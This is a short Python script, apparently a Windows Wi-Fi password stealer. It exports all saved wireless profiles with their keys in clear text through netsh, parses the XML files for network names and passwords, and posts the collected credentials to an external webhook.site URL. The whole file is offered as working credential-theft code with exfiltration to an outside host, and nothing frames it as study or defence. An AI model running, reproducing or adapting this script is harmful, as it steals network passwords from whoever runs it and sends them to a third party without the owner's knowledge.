import os
import requests
os.chdir('C:\\Users\\frase\\Desktop\\py\\wifi ackerh\\wifis')
os.system('netsh wlan export profile key=clear')
liste=[]
g=0
for i in os.listdir():
    if i.startswith('WiFi-') and i.endswith('.xml'):
        with open(i,'r') as n:
            templist=[]
            for i in n.readlines():
                if 'name' in i:
                    if g==0:
                        striped=i.strip()
                        front=striped[6:]
                        back=front[:-7]
                        templist.append(back)
                        g=1
                    elif g==1:
                        continue
                if 'keyMaterial' in i:
                    striped=i.strip()
                    front=striped[13:]
                    back=front[:-14]
                    templist.append(back)
            g=0
            liste.append(templist)
requests.post('https://webhook.site/c9e5dcbb-2fbe-4681-bdb7-2974a3447c4d',data={'data': str(liste)})
